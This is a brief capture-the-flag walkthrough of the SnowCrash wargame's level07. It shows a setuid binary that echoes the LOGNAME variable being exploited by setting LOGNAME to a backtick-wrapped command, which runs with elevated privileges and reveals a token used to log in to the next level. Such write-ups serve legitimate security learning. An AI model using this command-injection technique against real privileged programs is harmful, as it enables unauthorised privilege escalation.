# level07

Using `ls`, we can discover another binary.

```bash
level07@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```

Let's dump his strings.

```bash
level07@SnowCrash:~$ readelf -p .rodata level07

String dump of section '.rodata':
  [     8]  LOGNAME
  [    10]  /bin/echo %s 
```

Ok, there is an attack vector on the %s echo parameter, we can see using section number that is probably passing LOGNAME env variable.

```bash
level07@SnowCrash:~$ ./level07
level07
level07@SnowCrash:~$ env | grep LOGNAME
LOGNAME=level07
```

Let's try to exploit it. Using ``` to evaluate command.

```bash
level07@SnowCrash:~$ export LOGNAME=\`getflag\`
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

Perfect, let's head to level08.

```bash
level07@SnowCrash:~$ su level08
Password: fiumuikeil55xe9cu4dood66h
level08@SnowCrash:~$ 
```
